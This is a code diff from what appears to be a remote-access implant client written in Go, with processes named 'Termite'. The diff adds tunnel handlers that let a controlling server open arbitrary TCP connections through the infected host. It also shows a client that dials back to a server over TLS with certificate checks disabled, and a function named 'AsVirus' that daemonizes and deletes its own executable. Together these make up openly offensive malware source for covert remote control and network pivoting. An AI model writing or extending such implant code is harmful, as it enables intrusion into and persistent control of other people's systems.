@@ -69,7 +69,6 @@ type TermiteProcess struct {
 }
 
 var processes map[string]*TermiteProcess
-
 var tunnels map[string]*net.Conn
 
 type Client struct {
@@ -263,7 +262,6 @@ func handleConnection(c *Client) {
 				log.Error("Network error: %s", err)
 				return
 			}
-		case message.CLIENT_INFO:
 		case message.DUPLICATED_CLIENT:
 			backoff.Current = oldBackoffCurrent
 			log.Error("Duplicated connection")
@@ -275,33 +273,69 @@ func handleConnection(c *Client) {
 				syscall.Kill(termiteProcess.process.Process.Pid, syscall.SIGTERM)
 				termiteProcess.ptmx.Close()
 			}
-			// case message.START_TUNNEL:
-			// case message.TUNNEL_IO:
-			// case message.STOP_TUNNEL:
+		case message.TUNNEL_CONNECT:
+			log.Info("%s", tunnels)
+			target := msg.Body.(*message.BodyTunnelConnect).Target
+			if _, exists := tunnels[target]; exists {
+				log.Error("Tunnel already connected!")
+				break
+			}
+			log.Info("Connection to: %s", target)
+			conn, err := net.Dial("tcp", target)
+			if err != nil {
+				log.Error(err.Error())
+			} else {
+				c.Encoder.Encode(message.Message{
+					Type: message.TUNNEL_CONNECTED,
+					Body: message.BodyTunnelConnected{
+						Target: target,
+					},
+				})
+
+				tunnels[target] = &conn
+				go func(target string, conn net.Conn) {
+					for {
+						data := make([]byte, 0x100)
+						n, err := conn.Read(data)
+						if err == nil {
+							if n > 0 {
+								c.Encoder.Encode(message.Message{
+									Type: message.TUNNEL_DATA,
+									Body: message.BodyTunnelData{
+										Target: target,
+										Data:   data[0:n],
+									},
+								})
+							}
+						} else {
+							break
+						}
+					}
+				}(target, conn)
+			}
+		case message.TUNNEL_DATA:
+			target := msg.Body.(*message.BodyTunnelData).Target
+			data := msg.Body.(*message.BodyTunnelData).Data
+			if conn, exists := tunnels[target]; exists {
+				(*conn).Write(data)
+			} else {
+				log.Error("No such tunnel")
+			}
+		case message.TUNNEL_DISCONNECT:
+			target := msg.Body.(*message.BodyTunnelDisconnect).Target
+			if conn, exists := tunnels[target]; exists {
+				log.Info("Closing conntion: %s", conn)
+				(*conn).Close()
+				delete(tunnels, target)
+			} else {
+				log.Error("No such tunnel")
+			}
 		}
 	}
 }
 
-// // TODO:
-// func Tunnel(host string, port uint16) {
-// 	proxy, err := net.Dial("tcp", fmt.Sprintf("%s:%d", host, port))
-// 	if err != nil {
-// 		log.Error(err)
-// 	}
-
-// 	fmt.Println("proxy connected")
-// 	go copyIO(conn, proxy)
-// 	go copyIO(proxy, conn)
-// }
-
-// func copyIO(src, dst net.Conn) {
-// 	defer src.Close()
-// 	defer dst.Close()
-// 	io.Copy(src, dst)
-// }
-
-// return: need retry
 func StartClient() bool {
+	needRetry := true
 	certBuilder := new(strings.Builder)
 	keyBuilder := new(strings.Builder)
 	crypto.Generate(certBuilder, keyBuilder)
@@ -312,17 +346,18 @@ func StartClient() bool {
 	cert, err := tls.X509KeyPair(pemContent, keyContent)
 	if err != nil {
 		log.Error("server: loadkeys: %s", err)
-		return true
+		return needRetry
 	}
 
 	config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
 	service := strings.Trim("xxx.xxx.xxx.xxx:xxxxx", " ")
+	service = "127.0.0.1:13337"
 	if hash.MD5(service) != "4d1bf9fd5962f16f6b4b53a387a6d852" {
 		log.Debug("Connecting to: %s", service)
 		conn, err := tls.Dial("tcp", service, &config)
 		if err != nil {
 			log.Error("client: dial: %s", err)
-			return true
+			return needRetry
 		}
 		defer conn.Close()
 
@@ -341,9 +376,9 @@ func StartClient() bool {
 			Decoder: gob.NewDecoder(conn),
 		}
 		handleConnection(c)
-		return true
+		return needRetry
 	} else {
-		return false
+		return !needRetry
 	}
 }
 
@@ -352,8 +387,7 @@ func RemoveSelfExecutable() {
 	os.Remove(filename)
 }
 
-func main() {
-
+func AsVirus() {
 	cntxt := &daemon.Context{
 		WorkDir: "/",
 		Umask:   027,
@@ -368,11 +402,13 @@ func main() {
 		return
 	}
 	defer cntxt.Release()
-
 	log.Success("daemon started")
 
 	RemoveSelfExecutable()
+}
 
+func main() {
+	// AsVirus()
 	message.RegisterGob()
 	backoff = CreateBackOff()
 	processes = map[string]*TermiteProcess{}
